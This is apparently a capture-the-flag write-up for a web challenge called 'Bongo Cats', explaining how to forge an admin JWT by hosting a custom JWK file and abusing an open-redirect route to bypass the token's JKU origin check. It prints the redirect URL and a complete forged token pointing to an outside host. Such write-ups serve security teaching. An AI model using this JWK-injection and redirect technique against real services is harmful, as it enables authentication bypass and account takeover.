# Bongo Cats

## Enumeration:

1) Site has three routes
```
    /login
    /redirect?uri=
    /dashboard
```

2) On login a jwt is set with `user` value and the jwt uses a hosted jwk file for authentication using the `jtu` field
3) The token is saved in cookies 
4) On trying `admin` username, the login page return an error indicating I can't use that username
4) The dashboard route displays the value of `user` in the jwt token 
4) Hence, it is understood I have to try and get a valid jwt token with `user:admin` in its claims
## Solution:

1) Generate custom jwk.json, and host online 
2) Generate new jwt with claim `user:admin` and `jtu` pointing to the custom jwk.json
3) The website blocked the above token, with the error that `jtu` does not match the provided jwk uri
4) This can be bypassed by using the `\redirect?uri=` route in the `jtu` field and pointing the `uri` query to the custom jwk file

```
http://34.133.45.223/redirect?uri=http://.../jwk.json
```
5) The dashboard route now returns the flag

## Evil JWT
`eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8zNC4xMzMuNDUuMjIzLz9yZWRpcmVjdF91cmk9aHR0cDovLzE1OS44OS4xNjEuODc6ODA4MC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJjMUs0bDBrSmJEeS1DYlVualdjaWNxaVZEYVJYRUNSbWVDcEFsaDFIMWxrIiwidHlwIjoiand0In0.eyJ1c2VyIjoiYWRtaW4ifQ.Zm-K1UglgoPyDPxgCmkhfTBum8yz_xUKtjcOO6qW3ufi1ytimbfNQsVX6WoTv_BlOQ4VFSgvsIRKeBZ3O5BRt-VQq4_TmRCjxs8VHOHS8TYIB75f1_DbrsyzKxYa2P_mdVc27eZG1g8MhtTkvEEj5a7Y2ZTA_s1zy9JGg6FGZXTF5pFLyqG3ZN_lzbiPO2KJeqDNt9-2AXpkDxDNbtEs7Rf2otYiwiGnb8b5XvAeewLPdzvfBOlDhMbfush2-XONtXNS3XUQth9I1-BzERrQ6rx70cUurcuYy177TPi6NHhLn0YOqAH6Pg6TEXJ5NGLihXF4NKMpPNv7gO069zpA3Q`
